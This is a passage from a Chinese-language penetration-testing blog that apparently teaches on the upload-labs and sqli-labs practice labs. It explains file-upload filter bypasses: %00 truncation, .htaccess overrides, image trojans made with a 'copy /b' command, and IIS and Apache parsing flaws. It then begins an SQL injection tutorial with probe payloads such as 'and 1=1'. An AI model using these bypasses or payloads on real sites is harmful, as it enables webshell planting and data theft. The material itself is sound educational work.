<h2 id="黑名单扩展名过滤"><a href="#黑名单扩展名过滤" class="headerlink" title="黑名单扩展名过滤"></a>黑名单扩展名过滤</h2><p>顾名思义，黑名单机制就是将一些禁止上传的文件的后缀名对比上传文件的后缀名，要是有符合的，则禁止上传该文件</p>
<p>这里用upload-labs的pass-03示例(不得不说upload这个项目确实可以，将大部分的文件上传防御机制都包含了，可以在这里练习如何绕过检测)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里禁止了<code>asp, aspx, php, jsp</code>文件后缀名</p>
<p>但是黑名单机制是一种不安全的方式，攻击者可以通过多种方式进行绕过：</p>
<ol>
<li><p>攻击者可以找到开发人员忽略的扩展名，比如：.phtml .phps .php5 .pht</p>
<p>前提是apache的<code>httpd.conf</code>中有配置别名解析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure>
</li>
<li><p>上传<code>.htaccess</code>文件，但是需要在<code>httpd.conf</code>中</p>
<p>1.<code>mod_rewrite模块开启</code></p>
<p>2.<code>AllowOverride All</code></p>
<p>此时就可以自定义apache将谁用php进行解析（注意上传时一定确保<code>.htaccess</code>文件名称为<code>.htaccess</code>）</p>
<blockquote>
<p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，<br>即在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。</p>
<p>可以如下使用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;指定文件名&quot;&gt;</span><br><span class="line">  SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>也可以如下使用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .指定文件后缀名，可以自定义后缀名</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
<li><p>Windows平台对文件扩展名的大小写不敏感，如果服务端没有进行大小写过滤，那就可以通过大小写文件后缀名进行绕过</p>
</li>
<li><p>在Windows平台，如果文件名以<code>.</code>或者空格作为结尾，系统会自动去除，利用此特性也可以绕过黑名单检测(注意文件后缀名可以在burpsuite里改)</p>
</li>
<li><p>在Windows平台上可以上传<code>.php::$DATA</code>绕过（原理是NTFS文件系统包括对备用数据流的支持，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：<code>$ DATA</code>。）</p>
</li>
</ol>
<h2 id="白名单扩展名过滤"><a href="#白名单扩展名过滤" class="headerlink" title="白名单扩展名过滤"></a>白名单扩展名过滤</h2><p>白名单的过滤方式与黑名单的恰恰相反，黑名单是规定不允许上传的文件扩展名，而白名单则是定义允许上传文件扩展名，白名单相比较黑名单安全性大大提高，但是也存在绕过风险，严格来说我之前说的MIME类型检测也是一种白名单机制。</p>
<p>还是用到upload举例，这里看Pass-12：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中白名单设置为：<code>$ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</code></p>
<p> 发现只允许了 <code>&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;</code>三种后缀名出现</p>
<p>这个时候绕过的方式就可以根据解析漏洞配合，具体的服务器有不同的解析漏洞，比如说是IIS6.0的目录解析漏洞和WebDav漏洞，以及Apache解析漏洞，等等</p>
<p>在Pass-12题中可以用到%00截断(关于00截断不止下面这种)</p>
<p>可以看到代码中有这两个部分<code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code>和<code>move_uploaded_file($temp_file,$img_path)</code></p>
<p>在PHP的的有些版本中<code>move_uploaded_file()</code>函数存在漏洞，其exp为<code>move_uploaded_file($_FILES[&#39;x&#39;][&#39;tmp_name&#39;],&quot;/tmp/test.php\x00.jpg&quot;)</code></p>
<p>这里有关于这个漏洞的描述：<a href="https://www.cnblogs.com/cyjaysun/p/4390930.html" target="_blank" rel="noopener">PHP任意文件上传漏洞CVE-2015-2348浅析</a></p>
<p><code>Pass-12</code>中<code>save_path</code>变量是可以可以get传参的，所以我们只需要在url中加入类似<code>?save_path=./upload/cmd.php%00</code>，上传文件名类似于<code>cmd.jpg</code>就能将文件保存在<code>./upload/cmd.php</code>中</p>
<h2 id="文件内容检测"><a href="#文件内容检测" class="headerlink" title="文件内容检测"></a>文件内容检测</h2><p>这也是一种检测方式，通常利用文件头校验原理，对用户上传的文件内容进行检测，判定其文件类型。</p>
<p>这种检测方式的绕过一般上传图片马，配合文件包含漏洞，获取<code>webshell</code>。在文件包含漏洞中，对包含文件的类型无要求，只要包含文件中含有PHP代码即可执行。</p>
<blockquote>
<p>使用CMD制作一句话木马。<br>参数/b指定以二进制格式复制、合并文件; 用于图像类/声音类文件<br>参数/a指定以ASCII格式复制、合并文件。用于txt等文档类文件<br>copy 1.jpg/b+1.php 2.jpg<br>//意思是将1.jpg以二进制与1.php合并成2.jpg<br>那么2.jpg就是图片木马了。</p>
</blockquote>
<p>这里用<code>upload-labs Pass-14</code>进行举例，服务端过滤代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中就是对文件内容进行了检测，我们制作图片马进行绕过</p>
<p><img src="https://s1.ax1x.com/2020/04/03/Ga6eOO.png" alt="Ga6eOO.png"></p>
<p>可以看到图片16进制中含有php代码了</p>
<p><img src="https://s1.ax1x.com/2020/04/03/GaR0bT.png" alt="GaR0bT.png"></p>
<p>可以看到配合文件包含漏洞执行了php代码</p>
<p><img src="https://s1.ax1x.com/2020/04/03/GaR5VO.png" alt="GaR5VO.png"></p>
<p><code>Pass-14</code>和<code>Pass-15</code>以及<code>Pass-16</code>都可以用上述的图片马进行绕过，因为他们的原理都是对文件头类型进行检测识别，但是对于<code>Pass-17</code>就不同，<code>Pass-17</code>是对图片进行二次渲染，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    $filename = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">'/'</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">"."</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">"jpg"</span>) &amp;&amp; ($filetype==<span class="string">"image/jpeg"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是jpg格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".jpg"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"png"</span>) &amp;&amp; ($filetype==<span class="string">"image/png"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是png格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".png"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"gif"</span>) &amp;&amp; ($filetype==<span class="string">"image/gif"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是gif格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".gif"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大致意思是服务端端调用了php的GD库，提取了文件中的图片数据，然后再重新渲染，这样图片中插入的恶意代码就会被过滤掉了</p>
<p>这种过滤方式不管是直接修改文件头来制作的图片马，还是利用<code>copy</code>命令制作的图片马，都无法避免其中的一句话被过滤掉。</p>
<p>其实绕过的话就要把一句话插入到图片数据中，这样经过渲染后这部分数据还是会保留下来。可以参考这篇：</p>
<p><a href="https://secgeek.net/bookfresh-vulnerability/" target="_blank" rel="noopener">BookFresh Tricky File Upload Bypass to RCE</a></p>
<p>可以看到其所用到的<code>POC.gif</code>中含有php代码：</p>
<p><img src="https://s1.ax1x.com/2020/04/03/Gahhq0.png" alt="Gahhq0.png"></p>
<h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><p>什么是解析漏洞？</p>
<p>解析漏洞指的是在服务器中间件上的问题，要想获得<code>webshell</code>，那一定要让服务器将攻击者上传的文件当作后端脚本来解析，但是通常的后端具有检测技术，可以检测到攻击者上传的<code>webshell</code>，但是开发人员如果仅从代码角度去防止<code>webshell</code>，那么他就忽略了服务器中间件的漏洞危害，中间件像Apache，Nginx，IIS，Tomcat等，在有些版本中存在解析漏洞，可以使攻击者利用这些解析漏洞，绕过开发人员的检测，实现非法文件的解析。</p>
<h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>在Apache 1.x和2.x中存在解析漏洞 ，解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断，如果都不认识，那么就暴漏其源代码。</p>
<p>因此可以上传一个test.php.qwea文件绕过验证且服务器依然会将其解析为php文件。</p>
<p>Apache能够认识的文件在mime.types文件里。</p>
<p><img src="https://s1.ax1x.com/2020/04/04/G0mulV.png" alt="G0mulV.png"></p>
<h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><p>IIS 6在解析文件时，也出现过一些漏洞</p>
<ol>
<li><p>在IIS 6和Windows环境下出现过<code>;</code>字符截断文件名的问题</p>
<p>当文件名为： <code>shell.asp;xx.jpg</code>时，IIS 6会将此文件解析为<code>shell.asp</code>，文件名被截断了，从而导致脚本被执行</p>
<p>所以当上传文件<code>shell.asp;xx.jpg</code>时，检测程序只会检测出后缀名为<code>.jpg</code>，如果不讲文件重命名存入服务器中，那么攻击者就可以访问<code>shell.asp;xx.jpg</code>，其中IIS 6会将文件当成<code>.asp</code>脚本解析。</p>
</li>
<li><p>IIS 6中还有一个漏洞就是目录解析的问题，因为处理文件夹扩展名出错，导致将<code>/*.asp/</code>目录下所有文件都作为ASP文件进行解析。</p>
<p>例如：建立<code>shell.asp</code>文件夹，在文件夹中新建一个文本文档<code>test.txt</code>，其中包含诸如<code>&lt;%=NOW()%&gt;</code>的asp代码，那么在访问例如<code>http://www.example.com/shell.asp/test.txt</code>，就会执行该代码。</p>
</li>
<li><p>在IIS中，还存在一种经典漏洞，就是<code>WebDav</code>，<code>WebDav</code>是一种基于HTTP 1.1协议的通信协议，它扩展了HTTP协议，使其在标准方法外新增了一些新的方法。</p>
<p>在开启<code>WebDav</code>扩展的服务器中，如果支持<code>PUT``Move``Copy``Delete</code>等方法，就有可能存在安全隐患</p>
<p>比如：可以先用<code>OPTIONS</code>先探测服务器所支持的HTTP方法，然后使用<code>PUT</code>方式上传脚本文件，再用<code>Move</code>或者<code>Copy</code>对文件进行改名，使之能被服务器所解析。</p>
</li>
</ol>
<p>更多的解析漏洞可以看这篇<a href="https://www.smi1e.top/文件解析漏洞总结/" target="_blank" rel="noopener">博客</a>，我的学识浅薄，目前也在学，之后要是碰到了新的关于文件上传的漏洞也会不断更新学习。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>文件上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入</title>
    <url>/2020/03/21/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        SQL注入漏洞是目前web安全中最为高危漏洞之一，在OWASP常年排名第一(截至2020.3.21)，也是最为常见的漏洞之一，虽然随着开发人员安全意识的提高和开发工程的模板化，SQL注入不再像以前那么随处可见且没有任何防护，但是渗透技术也日趋复杂多样，而且提供web服务的企业太多了，并不是每一个企业的web服务都具有良好的安全防护措施，所以SQL注入目前还是渗透人员必须所具备的能力之一。</p>
<p>​        对大多数数据库而言，SQL注入的原理是类似的，因为每个SQL数据库都要一定的遵守SQL语法，但它们之间存在一些差异，本文章因为技术有限，使用市面上常用的SQL数据库——MySQL数据库进行举例说明，但疏通同归，攻击者对数据库的注入，其利用方式也是类似的：</p>
<ul>
<li>查询数据</li>
<li>读写文件</li>
<li>执行命令</li>
</ul>
<p>​        在权限允许的情况下，通常数据库都支持以上三种操作，而且攻击者的最终目的也是以上三种，只不过不同数据库注入的SQL语句不一样而已。</p>
<p>​        通常的SQL注入可以使用工具，比如SQLmap，其内置了很多功能，全面而强大，但是还是要掌握一些手动注入的方式，才能真正了解SQL注入。</p>
<a id="more"></a>

<h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><h2 id="SQL注入的产生"><a href="#SQL注入的产生" class="headerlink" title="SQL注入的产生"></a>SQL注入的产生</h2><p>​        其实SQL注入漏洞的产生不难理解，就是用户在前端输入的数据交付给后端，数据要和SQL语句拼接成为完整的SQL语句，而此时后端对用户输入数据过滤不严，将其直接带入SQL语句进入SQL数据库查询，并且将结果返回到前端显示位上。</p>
<p>​        可以从程序的角度去理解这句话：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;including the Mysql connect parameters.</span><br><span class="line">include(&quot;..&#x2F;sql-connections&#x2F;sql-connect.php&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F; take the variables </span><br><span class="line">if(isset($_GET[&#39;id&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">&#x2F;&#x2F;logging the connection parameters to a file for analysis.</span><br><span class="line">$fp&#x3D;fopen(&#39;result.txt&#39;,&#39;a&#39;);</span><br><span class="line">fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; connectivity </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br><span class="line">$result&#x3D;mysql_query($sql);</span><br><span class="line">$row &#x3D; mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">	if($row)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo &quot;&lt;font size&#x3D;&#39;5&#39; color&#x3D; &#39;#99FF00&#39;&gt;&quot;;</span><br><span class="line">  	echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  	echo &#39;Your Password:&#39; .$row[&#39;password&#39;];</span><br><span class="line">  	echo &quot;&lt;&#x2F;font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	else </span><br><span class="line">	&#123;</span><br><span class="line">	echo &#39;&lt;font color&#x3D; &quot;#FFFF00&quot;&gt;&#39;;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;&#x2F;font&gt;&quot;;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>(以上程序截取自sqli-Less1)</p>
<p>发现其中<code>$id</code>是来自前端<code>$_GET</code>传参进来，但在php程序中未经任何处理就直接拼接成SQL语句：</p>
<p><code>SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1</code></p>
<p>这就造成了SQL注入</p>
<h2 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h2><ol>
<li><p>依据变量类型：</p>
<ul>
<li>数字型注入</li>
<li>字符型注入</li>
</ul>
</li>
<li><p>依据传参方式：</p>
<ul>
<li>GET注入</li>
<li>POST注入</li>
<li>Cookie注入</li>
</ul>
</li>
<li><p>依据注入的方式：</p>
<ul>
<li>报错注入</li>
<li>延时注入</li>
<li>布尔盲注</li>
<li>DNSlog注入</li>
<li>。。。。。(SQL注入的方式很多，甚至有更多骚操作不断被人发现利用中)</li>
</ul>
</li>
</ol>
<h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>​        当输入的变量为整型时，若存在注入点，则可以称为数字型注入。</p>
<blockquote>
<p>eg：假设有URL为<code>HTTP://www.sqlinject.com/test.php?id=3</code></p>
<p>若SQL语句为<code>select * from table where id=3</code>则此时参数为整型</p>
<p>可以通过以下步骤检测是否有注入：</p>
<ol>
<li>id=3’  发现报错 SQL语句为<code>select * from table where id=3&#39;</code></li>
<li>id=3 and 1=1 无错误 SQL语句为<code>select * from table where id=3 and 1=1</code></li>
<li>id=3 and 1=2 语句正常但无法查出数据 SQL语句为<code>select * from table where id=3 and 1=2</code></li>
</ol>
</blockquote>
<p>​        数字型注入一般出现在ASP，PHP等弱类型语言中，因为弱类型语言会自动推导变量类型，例如：id=3时，会认为id变量为int类型，而id=3 and 1=1时，则会推导为string类型，这是弱类型语言的特性。</p>
<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>​        当输入参数为字符串时，称为字符型。而字符型数据在注入的时候需要单引号 <code>&#39;</code> 去进行闭合。</p>
<p>​        例如： <code>select * from table where username=&#39;root&#39;</code></p>
<p>​        而此时注入就要用到单引号闭合：  <code>select * from table where username=&#39;root&#39; order by 4--+&#39;</code>(猜解列数)</p>
<h3 id="POST注入-amp-GET注入-amp-Cookie-注入"><a href="#POST注入-amp-GET注入-amp-Cookie-注入" class="headerlink" title="POST注入 &amp;GET注入&amp;Cookie 注入"></a>POST注入 &amp;GET注入&amp;Cookie 注入</h3><p>​        这三种注入类似，主要依据注入的位置来分辨，根据名称也很好理解，无非是表单在传输数据的方式有所不同，注意的是，cookie注入依据是php中<code>$_REQUEST</code>变量（默认情况下包含了 <code>$_GET</code>，<code>$_POST</code>和 <code>$_COOKIE</code>的数组），在GET和POST都做了输入过滤的时候，可以通过构造cookie变量形成注入。（但是这一特性在PHP5.4版本就不接受cookie传参了）</p>
<h1 id="SQL手动注入"><a href="#SQL手动注入" class="headerlink" title="SQL手动注入"></a>SQL手动注入</h1><h2 id="MySQL数据库"><a href="#MySQL数据库" class="headerlink" title="MySQL数据库"></a>MySQL数据库</h2><p>MySQL数据库是现在最为常用的数据库，一般和PHP组成后端黄金搭档，在SQL注入里，关于MySQL数据库也有很多技巧。</p>
<ol>
<li><p>在MySQL5.0以后的版本，DBMS会自带一个信息数据库INFORMATION_SCHEMA，里面提供了访问元数据的一些方式。在INFORMATION_SCHEMA中有很多关键信息表：</p>
<p><img src="https://s1.ax1x.com/2020/03/26/GSUAnx.png" alt="GSUAnx.png"></p>
<p>在进行SQL注入的时候可以从这个信息数据库下手得到关键信息，如果没有这个表怎么办，当然也可以通过爆破获得关键信息，这个时候就要借助SQL注入工具来实现</p>
<ol start="2">
<li>一些相关函数：</li>
</ol>
<p>Database()                        返回当前所使用的数据库名称</p>
<p>Version()                           返回当前版本信息</p>
